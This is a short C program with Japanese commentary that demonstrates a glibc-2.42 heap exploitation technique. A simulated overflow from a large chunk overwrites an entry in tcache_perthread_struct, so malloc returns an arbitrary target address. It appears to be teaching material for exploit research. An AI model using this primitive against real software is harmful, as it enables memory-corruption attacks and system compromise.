#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	// _IO_FILE がヒープに干渉しないよう、バッファリングを無効にします
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	// 導入
	puts("このファイルは glibc-2.42 の興味深い特徴を示します。`tcache_perthread_struct`");
	puts("がヒープの先頭にない場合があり、ヒープ破壊(heap corruption)を任意の場所への確保(arbitrary allocation)に変えやすくなります。\n");


	puts("以前は、ヒープを使う前に、libc は `MAYBE_INIT_TCACHE` を使って tcache を初期化していました。");
	puts("しかし次のパッチにより、tcache を使わない経路ではこの呼び出しが削除されました: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=cbfd7988107b27b9ff1d0b57fa2c8f13a932e508");
	puts("その結果、tcache_perthread_struct の前に多数の大きなチャンクを置くことができ、");
	puts("ヒープオーバーフローのプリミティブ(または chunk overlapping)を使って `tcache_perthread_struct` を乗っ取れます\n");
	
	puts("この構造体の乗っ取りは、UAF(use-after-free)のプリミティブを使っても可能です。");
	puts("`tcache_perthread_struct` の初期化前に、解放済みの大きなチャンクに対する UAF があれば、");
	puts("確保された `tcache_perthread_struct` である、分割されたチャンクを制御できます\n");

	long target[0x4] __attribute__ ((aligned (0x10)));

	long *chunk = malloc(0x420);
	printf("まず、ヒープの先頭に大きなチャンクを確保します: %p\n", chunk);
	void *p1 = malloc(0x10);
	free(p1);
	printf("次に、チャンクを確保して解放し、tcache_perthread_struct を初期化して、私たちのチャンクの直後に置きます\n");
	printf("tcache_perthread_struct->tcache_entry[0] は %p で初期化されるはずです\n", p1);

	printf("ここで、オーバーフロー脆弱性を模擬して、ポインタを上書きします\n");
	/*Vulnerability*/
	chunk[0x420/8+25] = (long)&target[0];
	/*Vulnerability*/

	void *p2 = malloc(0x10);
	printf("すると、次の確保は私たちの狙ったアドレスになります: %p\n", p2);
	assert(p2 == &target[0]);
}
